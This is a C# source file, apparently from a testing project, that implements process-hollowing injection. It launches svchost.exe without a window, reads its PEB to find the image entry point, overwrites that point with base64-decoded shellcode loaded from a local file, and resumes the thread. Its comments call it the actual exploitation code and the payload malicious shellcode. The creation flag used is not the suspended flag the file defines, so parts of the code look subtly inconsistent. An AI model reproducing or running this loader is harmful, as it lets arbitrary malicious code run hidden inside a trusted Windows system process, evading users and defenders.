using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace CShellHollowingTesting
{
  public class Program
  {
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);


    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
      public IntPtr ExitStatus;
      public IntPtr PebAddress;
      public IntPtr AffinityMask;
      public IntPtr BasePriority;
      public IntPtr UniquePID;
      public IntPtr InheritedFromUniqueProcessId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
      public Int32 cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public Int32 dwX;
      public Int32 dwY;
      public Int32 dwXSize;
      public Int32 dwYSize;
      public Int32 dwXCountChars;
      public Int32 dwYCountChars;
      public Int32 dwFillAttribute;
      public uint dwFlags;
      public Int16 wShowWindow;
      public Int16 cbReserved2;
      public IntPtr lpReserved2;
      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    public static class CreationFlags
    {
      public const uint SUSPENDED = 0x4;
      public const uint CREATE_NO_WINDOW = 0x8000000;
      public const uint STARTF_USESTDHANDLES = 0x100;
    }

    static async Task Main(string[] args)
    {
      // Pseudocode inserted due to two different payload versions that were used
      // for testing. One version used a file with the payload being encoded, the other
      // version used dynamic loading from a local web server.
      // Rest of the code, aside from these two lines is the actual exploitation code used.
      var base64payload = File.ReadAllText("placeholder.txt");
      var shellcode = Convert.FromBase64String(base64payload);

      PROCESS_INFORMATION proc_info = new PROCESS_INFORMATION();
      STARTUPINFO startup_info = new STARTUPINFO();
      PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
      string targetPath = @"C:\\Windows\\System32\\svchost.exe";
      var procINIT = CreateProcessA(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.CREATE_NO_WINDOW,
                      IntPtr.Zero, null, ref startup_info, ref proc_info);
      
      uint retLength = 0;
      IntPtr procHandle = proc_info.hProcess;
      ZwQueryInformationProcess(procHandle, 0, ref pbi, (uint)(IntPtr.Size * 6), ref retLength);
      IntPtr imageBaseAddr = (IntPtr)((Int64)pbi.PebAddress + 0x10);

      byte[] baseAddrBytes = new byte[0x8];
      IntPtr lpNumberofBytesRead = IntPtr.Zero;
      ReadProcessMemory(procHandle, imageBaseAddr, baseAddrBytes, baseAddrBytes.Length, out lpNumberofBytesRead);
      IntPtr execAddr = (IntPtr)(BitConverter.ToInt64(baseAddrBytes, 0));

      byte[] data = new byte[0x200];
      ReadProcessMemory(procHandle, execAddr, data, data.Length, out lpNumberofBytesRead);

      uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
      Console.WriteLine("[*] e_lfanew: 0x{0}", e_lfanew.ToString("X"));

      uint rvaOffset = e_lfanew + 0x28;
      uint rva = BitConverter.ToUInt32(data, (int)rvaOffset);

      IntPtr entrypointAddr = (IntPtr)((UInt64)execAddr + rva);
      Console.WriteLine("[*] Entrypoint Found: 0x{0}", entrypointAddr.ToString("X"));

      // At this point the entry point address of the process is found and the only thing that is yet required, is to write the
      // actual malicious shellcode into the address space of the process, starting at its base address.
      IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
      WriteProcessMemory(procHandle, entrypointAddr, shellcode, shellcode.Length, ref lpNumberOfBytesWritten);

      // Finally, the process is resumed.
      IntPtr threadHandle = proc_info.hThread;
      ResumeThread(threadHandle);
    }
  }
}